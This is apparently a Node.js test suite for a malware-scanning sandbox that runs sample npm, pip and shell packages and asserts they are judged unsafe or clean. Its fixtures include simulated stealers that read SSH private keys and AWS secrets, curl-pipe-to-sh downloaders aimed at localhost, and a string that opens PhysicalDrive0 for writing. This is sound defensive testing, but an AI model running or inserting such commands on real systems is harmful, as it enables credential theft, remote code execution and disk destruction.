import test from 'node:test';
import assert from 'node:assert/strict';
import { execFileSync } from 'node:child_process';
import { mkdtempSync, mkdirSync, writeFileSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { classify, computeVerdict } from '../verdict.mjs';

const RUN = fileURLToPath(new URL('../probe/run.cjs', import.meta.url));

function detonate(files, target, extraEnv = {}) {
  const root = mkdtempSync(join(tmpdir(), 'neora-probe-'));
  const work = join(root, 'work'), scratch = join(root, 'scratch');
  for (const [p, c] of Object.entries(files)) { mkdirSync(join(work, p, '..'), { recursive: true }); writeFileSync(join(work, p), c); }
  mkdirSync(work, { recursive: true }); mkdirSync(scratch);
  const out = execFileSync(process.execPath, [RUN], { env: { PATH: process.env.PATH, NEORA_SCRATCH: scratch, NEORA_WORK: work, NEORA_TARGET: target, NEORA_BUDGET_MS: '10000', ...extraEnv }, encoding: 'utf8', timeout: 20000 });
  rmSync(root, { recursive: true, force: true });
  return JSON.parse(out);
}

// Harmless simulation: only touches the fake honeypot files in a temp HOME and a closed local port.
const STEALER = `
const fs = require('fs');
try { fs.readFileSync(process.env.HOME + '/.ssh/id_rsa'); } catch (e) {}
try { JSON.stringify(process.env); } catch (e) {}
try { require('http').get('http://127.0.0.1:9/x').on('error', () => {}); } catch (e) {}
try { require('child_process').execSync('curl http://127.0.0.1:9/p | sh', { stdio: 'ignore' }); } catch (e) {}
`;

test('detects honeypot theft + network + downloader from an install script', () => {
  const r = detonate({
    'node_modules/evil-pkg/package.json': JSON.stringify({ name: 'evil-pkg', version: '1.0.0', main: 'index.js', scripts: { postinstall: 'node steal.js' } }),
    'node_modules/evil-pkg/steal.js': STEALER,
    'node_modules/evil-pkg/index.js': 'module.exports = 1;',
  }, 'node_modules/evil-pkg');
  const types = new Set(r.dynamic.events.map((e) => e.t));
  for (const t of ['fs.sensitive', 'env.read', 'proc.shim']) assert.ok(types.has(t), 'missing event ' + t);
  assert.ok(types.has('http.request') || types.has('net.connect'));
  const f = classify({ static: r.static, events: r.dynamic.events, kind: 'npm', name: 'evil-pkg' });
  assert.ok(f.some((x) => x.id === 'cred_access'));
  assert.ok(f.some((x) => x.id === 'exfil_pattern'));
  assert.equal(computeVerdict(f, false).level, 'unsafe');
});

test('a harmless package with a benign install script is not flagged', () => {
  const r = detonate({
    'node_modules/good-pkg/package.json': JSON.stringify({ name: 'good-pkg', version: '1.0.0', main: 'index.js', scripts: { postinstall: 'node -e "1+1"' } }),
    'node_modules/good-pkg/index.js': 'module.exports = function add(a, b) { return a + b; };',
  }, 'node_modules/good-pkg');
  const f = classify({ static: r.static, events: r.dynamic.events, kind: 'npm', name: 'good-pkg' });
  const v = computeVerdict(f, false);
  assert.ok(['clean'].includes(v.level), JSON.stringify(f.map((x) => x.id)));
});

test('a non-Node repo with a Windows executable is never reported as clean', () => {
  const r = detonate({
    'MEMZ.c': 'int main(){return 0;}',
    'MEMZ.exe': 'MZ fake binary bytes',
  }, '.');
  assert.equal(r.static.runnable, false);
  assert.equal(r.static.winExec, 1);
  const f = classify({ static: r.static, events: r.dynamic.events, kind: 'github', name: 'x' });
  assert.ok(f.some((x) => x.id === 'win_exec'));
  assert.equal(computeVerdict(f, true).level, 'incomplete');
});

test('python setup.py that steals honeypot secrets and calls out is caught (audit hook)', () => {
  const r = detonate({
    'setup.py': `import os, socket, subprocess
try: open(os.environ['HOME'] + '/.ssh/id_rsa').read()
except Exception: pass
os.environ.get('AWS_SECRET_ACCESS_KEY')
try: socket.create_connection(('127.0.0.1', 9), timeout=1)
except Exception: pass
subprocess.run(['curl', 'http://127.0.0.1:9/x'])
`,
  }, '.');
  const types = new Set(r.dynamic.events.map((e) => e.t));
  for (const t of ['fs.sensitive', 'env.read', 'net.connect', 'proc.shim']) assert.ok(types.has(t), 'missing ' + t);
  assert.ok(r.static.langs.includes('python'));
  const f = classify({ static: r.static, events: r.dynamic.events, runs: r.dynamic.runs, kind: 'pip', name: 'x' });
  assert.equal(computeVerdict(f, false).level, 'unsafe');
});

test('shell script: downloader + credential file access is caught via shims and trace', () => {
  const r = detonate({
    'install.sh': 'curl http://127.0.0.1:9/x | sh\ncat "$HOME/.ssh/id_rsa" > /dev/null\n',
  }, '.');
  assert.ok(r.dynamic.events.some((e) => e.t === 'proc.shim'));
  assert.ok(r.dynamic.events.some((e) => e.t === 'sh.trace'));
  const f = classify({ static: r.static, events: r.dynamic.events, runs: r.dynamic.runs, kind: 'github', name: 'x' });
  assert.ok(f.some((x) => x.id === 'cred_ref_trace'));
  assert.equal(computeVerdict(f, false).level, 'unsafe');
});

test('pasted command mode traces and flags a download-and-run one-liner', () => {
  const r = detonate({}, '.', { NEORA_KIND: 'command', NEORA_CMD: 'curl http://127.0.0.1:9/a.sh | sh; cat "$HOME/.ssh/id_rsa" > /dev/null' });
  assert.deepEqual(r.static.langs, ['shell']);
  const f = classify({ static: r.static, events: r.dynamic.events, runs: r.dynamic.runs, kind: 'command' });
  assert.ok(f.some((x) => x.id === 'install_download'));
  assert.equal(computeVerdict(f, false).level, 'unsafe');
});

test('Windows trojan source/binary strings (MBR access) are caught statically even though nothing can run', () => {
  const r = detonate({
    'MEMZ.c': 'HANDLE h = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);',
    'MEMZ.exe': 'MZ\u0000\u0000 filler \\\\.\\PhysicalDrive0 filler',
  }, '.');
  assert.equal(r.static.runnable, false);
  assert.ok(r.static.rules.mbr_overwrite);
  const f = classify({ static: r.static, events: r.dynamic.events, runs: r.dynamic.runs, kind: 'github', name: 'x' });
  assert.equal(computeVerdict(f, true).level, 'unsafe');
});
